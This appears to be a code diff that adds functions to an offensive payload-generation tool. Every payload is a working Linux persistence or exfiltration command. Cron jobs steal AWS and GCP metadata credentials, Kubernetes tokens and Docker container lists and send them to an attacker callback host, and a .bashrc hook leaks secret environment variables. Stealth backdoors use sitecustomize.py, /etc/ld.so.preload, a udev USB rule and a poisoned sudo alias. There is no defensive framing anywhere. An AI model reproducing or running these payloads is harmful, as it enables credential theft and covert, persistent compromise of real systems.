@@ -653,3 +653,84 @@ export function buildAllPersistencePayloads(lhost: string, lport: string, cmd: s
     ...buildDCSyncEvasion(),
   ];
 }
+
+/** Cloud credential exfiltration persistence — AWS, GCP, Azure, K8s, Docker. */
+export function buildCloudPersistence(cbHost: string, cbPort: string): PersistencePayload[] {
+  const base = `http://${cbHost}:${cbPort}`;
+  return [
+    {
+      technique: "AWS IMDS credential poller",
+      command: [
+        "(crontab -l 2>/dev/null;",
+        `echo "*/10 * * * * ROLE=$(curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null);`,
+        `curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null`,
+        `| base64 -w0 | xargs -I{} curl -sk '${base}/c?d={}' 2>/dev/null")`,
+        "| crontab -",
+      ].join(" "),
+      notes: "Exfiltrates fresh AWS IAM role credentials every 10 min via cron.",
+    },
+    {
+      technique: "GCP metadata token poller",
+      command: [
+        "(crontab -l 2>/dev/null;",
+        `echo "*/15 * * * * curl -sf -H 'Metadata-Flavor: Google'`,
+        `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null`,
+        `| base64 -w0 | xargs -I{} curl -sk '${base}/c?p=gcp&d={}' 2>/dev/null")`,
+        "| crontab -",
+      ].join(" "),
+      notes: "Polls GCP OAuth token every 15 min and exfiltrates encoded.",
+    },
+    {
+      technique: "K8s service account token exfil",
+      command: [
+        "(crontab -l 2>/dev/null;",
+        `echo "*/5 * * * * SA=/run/secrets/kubernetes.io/serviceaccount/token;`,
+        `[ -f \\\"$SA\\\" ] && cat \\\"$SA\\\" | base64 -w0 | xargs -I{} curl -sk '${base}/k8s?d={}' 2>/dev/null")`,
+        "| crontab -",
+      ].join(" "),
+      notes: "Exfiltrates K8s service account JWT every 5 min for API pivot.",
+    },
+    {
+      technique: "Docker socket enumerate",
+      command: [
+        "(crontab -l 2>/dev/null;",
+        `echo "*/30 * * * * [ -S /var/run/docker.sock ]`,
+        `&& curl -sf --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null`,
+        `| base64 -w0 | xargs -I{} curl -sk '${base}/docker?d={}' 2>/dev/null")`,
+        "| crontab -",
+      ].join(" "),
+      notes: "Enumerates running containers via Docker socket every 30 min.",
+    },
+    {
+      technique: "Secret ENV dump on bash login",
+      command: `echo 'env | grep -iE "AWS_|GOOGLE_|SECRET|TOKEN|KEY|PASS" 2>/dev/null | base64 -w0 | xargs -I{} curl -sk "${base}/env?d={}" 2>/dev/null &' >> ~/.bashrc`,
+      notes: "Exfiltrates secret env vars silently on every bash login.",
+    },
+  ];
+}
+
+/** Stealth Linux persistence — advanced techniques that resist auditd/LSM detection. */
+export function buildStealthPersistence(safeCmd: string): PersistencePayload[] {
+  return [
+    {
+      technique: "Python sitecustomize.py backdoor",
+      command: `python3 -c "import site; p=site.getsitepackages()[0]+'/sitecustomize.py'; open(p,'a').write('\\nimport os\\nos.system(\\"${safeCmd} &\\")\\n')" 2>/dev/null`,
+      notes: "Executes on every Python process start. Survives reboots if Python is used regularly.",
+    },
+    {
+      technique: "LD_PRELOAD .so drop (root or user-level)",
+      command: `printf '#include<unistd.h>\\nvoid __attribute__((constructor)) _i(){system("${safeCmd} &");}' > /tmp/.sl.c && gcc -shared -fPIC /tmp/.sl.c -o /tmp/.sl.so 2>/dev/null && echo /tmp/.sl.so >> /etc/ld.so.preload 2>/dev/null; rm -f /tmp/.sl.c`,
+      notes: "Injects into every dynamically-linked binary. Requires /etc/ld.so.preload write (root).",
+    },
+    {
+      technique: "Udev rule on USB insert",
+      command: `echo 'ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"${safeCmd}\"' > /etc/udev/rules.d/99-nx.rules 2>/dev/null && udevadm control --reload-rules 2>/dev/null`,
+      notes: "Triggers on any USB insertion. No cron, no login hook — extremely stealthy.",
+    },
+    {
+      technique: "Alias poisoning in .bashrc",
+      command: `echo 'alias sudo="bash -c \\"${safeCmd} >/dev/null 2>&1; exec sudo $*\\" --"' >> ~/.bashrc`,
+      notes: "Wraps sudo — command runs silently before real sudo on every invocation.",
+    },
+  ];
+}
